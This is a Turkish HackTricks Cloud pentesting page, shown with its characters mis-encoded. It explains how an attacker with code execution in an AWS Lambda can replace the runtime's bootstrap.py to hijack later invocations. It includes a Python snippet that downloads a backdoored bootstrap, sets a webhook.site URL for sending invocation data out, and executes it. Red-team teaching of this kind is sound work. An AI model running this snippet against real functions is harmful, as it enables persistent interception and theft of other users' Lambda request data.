# AWS - Lambda Ä°steklerini Ã‡al

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Lambda AkÄ±ÅŸÄ±

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**, **init** sÃ¼recine **Ã§aÄŸrÄ±lar** gÃ¶nderen konteyner dÄ±ÅŸÄ±ndaki bir sÃ¼reÃ§tir.
2. Init sÃ¼reci, bazÄ± ilginÃ§ uÃ§ noktalarÄ± aÃ§Ä±ÄŸa Ã§Ä±karan **9001** portunu dinler:
* **`/2018-06-01/runtime/invocation/next`** â€“ bir sonraki Ã§aÄŸrÄ± olayÄ±nÄ± al
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** â€“ Ã§aÄŸrÄ± iÃ§in iÅŸleyici yanÄ±tÄ±nÄ± dÃ¶ndÃ¼r
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** â€“ bir yÃ¼rÃ¼tme hatasÄ± dÃ¶ndÃ¼r
3. **bootstrap.py**, init sÃ¼recinden Ã§aÄŸrÄ±larÄ± alan bir dÃ¶ngÃ¼ye sahiptir ve bunlarÄ± iÅŸlemek iÃ§in kullanÄ±cÄ± kodunu Ã§aÄŸÄ±rÄ±r (**`/next`**).
4. Son olarak, **bootstrap.py** init'e **yanÄ±t** gÃ¶nderir.

Bootstrap'Ä±n kullanÄ±cÄ± kodunu bir modÃ¼l olarak yÃ¼klediÄŸini unutmayÄ±n, bu nedenle kullanÄ±cÄ± kodu tarafÄ±ndan gerÃ§ekleÅŸtirilen herhangi bir kod yÃ¼rÃ¼tmesi aslÄ±nda bu sÃ¼reÃ§te gerÃ§ekleÅŸmektedir.

## Lambda Ä°steklerini Ã‡almak

Bu saldÄ±rÄ±nÄ±n amacÄ±, kullanÄ±cÄ± kodunun, savunmasÄ±z isteÄŸi iÅŸleyen **`bootstrap.py`** sÃ¼reci iÃ§inde kÃ¶tÃ¼ niyetli bir **`bootstrap.py`** sÃ¼reci Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlamaktÄ±r. Bu ÅŸekilde, **kÃ¶tÃ¼ niyetli bootstrap** sÃ¼reci, istekleri iÅŸlemek iÃ§in **init sÃ¼reciyle** **iletiÅŸim kurmaya** baÅŸlayacak, bÃ¶ylece **meÅŸru** bootstrap, kÃ¶tÃ¼ niyetli olanÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken **tuzaÄŸa dÃ¼ÅŸmÃ¼ÅŸ** olacak ve init sÃ¼recine istek sormayacaktÄ±r.

Bu, kullanÄ±cÄ± kodunun meÅŸru **`bootstrap.py`** sÃ¼reci tarafÄ±ndan yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ iÃ§in basit bir gÃ¶revdir. BÃ¶ylece saldÄ±rgan:

* **Mevcut Ã§aÄŸrÄ±nÄ±n sahte bir sonucunu init sÃ¼recine gÃ¶nderebilir**, bÃ¶ylece init, bootstrap sÃ¼recinin daha fazla Ã§aÄŸrÄ± beklediÄŸini dÃ¼ÅŸÃ¼nebilir.
* **`/${invoke-id}/response`** adresine bir istek gÃ¶nderilmelidir.
* Invoke-id, meÅŸru **`bootstrap.py`** sÃ¼recinin yÄ±ÄŸÄ±nÄ±ndan [**inspect**](https://docs.python.org/3/library/inspect.html) python modÃ¼lÃ¼nÃ¼ kullanarak (burada [Ã¶nerildiÄŸi gibi](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch_runtime.py)) veya sadece tekrar **`/2018-06-01/runtime/invocation/next`** adresine istekte bulunarak elde edilebilir (burada [Ã¶nerildiÄŸi gibi](https://github.com/Djkusik/serverless_persistency_poc/blob/master/gcp/exploit_files/switcher.py)).
* Bir sonraki Ã§aÄŸrÄ±larÄ± yÃ¶netecek kÃ¶tÃ¼ niyetli **`boostrap.py`**'yi Ã§alÄ±ÅŸtÄ±rÄ±n.
* Gizlilik amacÄ±yla, lambda Ã§aÄŸrÄ± parametrelerini saldÄ±rganÄ±n kontrolÃ¼ndeki C2'ye gÃ¶ndermek ve ardÄ±ndan istekleri normal ÅŸekilde iÅŸlemek mÃ¼mkÃ¼ndÃ¼r.
* Bu saldÄ±rÄ± iÃ§in, **`bootstrap.py`**'nin orijinal kodunu sistemden veya [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py) Ã¼zerinden almak, kÃ¶tÃ¼ niyetli kodu eklemek ve mevcut lambda Ã§aÄŸrÄ±sÄ±ndan Ã§alÄ±ÅŸtÄ±rmak yeterlidir.

### SaldÄ±rÄ± AdÄ±mlarÄ±

1. Bir **RCE** aÃ§Ä±ÄŸÄ± bulun.
2. **KÃ¶tÃ¼ niyetli** bir **bootstrap** oluÅŸturun (Ã¶rneÄŸin [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py))
3. KÃ¶tÃ¼ niyetli bootstrap'Ä± **Ã§alÄ±ÅŸtÄ±rÄ±n**.

Bu eylemleri kolayca gerÃ§ekleÅŸtirebilirsiniz:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Daha fazla bilgi iÃ§in [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda_bootstrap_switcher) adresini kontrol edin.

## Referanslar

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
